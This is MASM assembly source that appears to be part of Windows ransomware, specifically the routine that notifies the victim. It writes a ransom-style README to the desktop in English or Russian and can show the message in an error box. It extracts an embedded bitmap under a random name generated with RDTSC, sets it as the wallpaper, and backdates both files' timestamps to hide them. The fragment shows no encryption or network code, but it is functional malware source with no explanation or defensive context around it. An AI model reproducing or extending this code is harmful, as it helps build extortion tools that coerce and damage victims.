NotificateUser proc
      invoke  SHGetSpecialFolderPath, 0, addr DesktopPath, CSIDL_DESKTOPDIRECTORY, 1
      
      invoke  DropTXT, addr DesktopPath
      
      mov     al, byte ptr [HideOrShowMessage]
      .if     al == 1
              invoke  MessageBox, 0, hMessage, 0, MB_ICONERROR
      .endif
      
      call    ChangeWallpaper
      
      ret
NotificateUser endp

DropTXT proc filename:DWORD
      invoke  lstrcpy, addr DropTxtBuf, filename
      invoke  PathAddBackslash, addr DropTxtBuf
      movzx   eax, byte ptr [UsingEngOrRuInFace]
      .if     eax == 1
              invoke  lstrcat, addr DropTxtBuf, addr ReadMe
      .else
              invoke  lstrcat, addr DropTxtBuf, addr ReadMe2
      .endif
      invoke  GetFileAttributes, addr DropTxtBuf
      .if     eax != -1
              jmp     drop_txt_file_exists
      .endif
      invoke  CreateFile, addr DropTxtBuf, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0
      mov     hFile, eax
      invoke  lstrlen, hMessage
      invoke  WriteFile, hFile, hMessage, eax, addr bw, NULL
      invoke  SetFileTime, hFile, addr sys_ct, addr sys_lat, addr sys_lwt
      invoke  CloseHandle, hFile
    drop_txt_file_exists:
      ret
DropTXT endp

ChangeWallpaper proc
      LOCAL   pSharedBuf  :DWORD
      LOCAL   rsrc_load   :DWORD
      LOCAL   rsrc_size   :DWORD
      LOCAL   hrsrc       :DWORD
      LOCAL   hBmpImg     :DWORD
      LOCAL   hNw         :DWORD
      
      ; gen bmp name
      mov     ecx, 10h
      mov     edi, offset imgname
    gen_name_lp:
      push    ecx
      push    edi
      db 0Fh, 31h
      pop     edi
      pop     ecx
      and     eax, 0F0h
      shr     eax, 4
      add     eax, 61h
      stosb
      loop    gen_name_lp
      xor     eax, eax
      stosb
      invoke  lstrcat, addr imgname, addr extension_bmp
      
      invoke  GetTempPath, sizeof BitmapExtractPath, addr BitmapExtractPath
      invoke  lstrcat, addr BitmapExtractPath, addr imgname
           
      invoke  FindResource, NULL, addr img_rsrc_name, RT_BITMAP
      .if     ( eax == 0 )
              ret
      .endif
      mov     hrsrc, eax
      invoke  SizeofResource, NULL, eax
      .if     ( eax == 0 )
              ret
      .endif
      mov     rsrc_size, eax
      invoke  LoadResource, NULL, hrsrc
      .if     ( eax == 0 )
              ret
      .endif
      mov     rsrc_load, eax
      invoke  LockResource, eax
      .if     ( eax == 0 )
              ret
      .endif
      mov     pSharedBuf, eax
      mov     ebx, eax

      invoke  CreateFile, addr BitmapExtractPath, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_WRITE or FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL
      .if     ( eax != INVALID_HANDLE_VALUE )
              mov     hBmpImg, eax
              invoke  SetFilePointer, hBmpImg, 0, 0, FILE_BEGIN
              invoke  WriteFile, hBmpImg, ebx, rsrc_size, addr hNw, NULL
              invoke  SetFileTime, hBmpImg, addr sys_ct, addr sys_lat, addr sys_lwt
              invoke  CloseHandle, hBmpImg
              invoke  SystemParametersInfo, SPI_SETDESKWALLPAPER, 0, addr BitmapExtractPath, SPIF_UPDATEINIFILE or SPIF_SENDCHANGE
      .endif

      invoke  FreeResource, rsrc_load
      ret
ChangeWallpaper endp